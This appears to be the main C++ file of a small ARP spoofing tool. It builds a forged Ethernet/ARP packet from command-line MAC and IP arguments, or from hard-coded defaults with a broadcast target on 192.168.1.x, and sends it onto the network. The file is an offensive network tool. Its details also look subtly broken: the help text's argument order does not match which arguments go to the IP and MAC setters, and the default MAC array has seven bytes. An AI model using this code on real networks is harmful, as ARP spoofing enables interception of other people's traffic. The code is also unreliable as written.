#include <iostream>
#include "arppacket.h"

int main(int argc, char* argv[])
{
    if(argc == 1){
        std::cout << "Help: ./arpspoof sourceMAC targetMAC sourceIP targetIP" << std::endl;
        // return 0;
    }

    EthernetPacket eth;
    std::cout << sizeof(eth) <<  std::endl;
    std::cout << sizeof(eth.arp) <<  std::endl;

    if(argc >= 5){
        eth.setSIP(argv[1]);
        eth.setTIP(argv[2]);
        eth.setSMAC(argv[3]);
        eth.setTMAC(argv[4]);
    } else {
        char srcMAC[] = {1,2,3,4,5,6,7};
        char trgMAC[] = {0xff,0xff,0xff,0xff,0xff,0xff};
        char srcIP[] = {192, 168, 1, 2};
        char trgIP[] = {192, 168, 1, 1};
        eth.setSIP(srcIP);
        eth.setTIP(trgIP);
        eth.setSMAC(srcMAC);
        eth.setTMAC(trgMAC);
    }
    std::cout << eth.toString() << std::endl;


    EthernetPacket * e = &eth;
    sendPacket(e);

    return 0;
}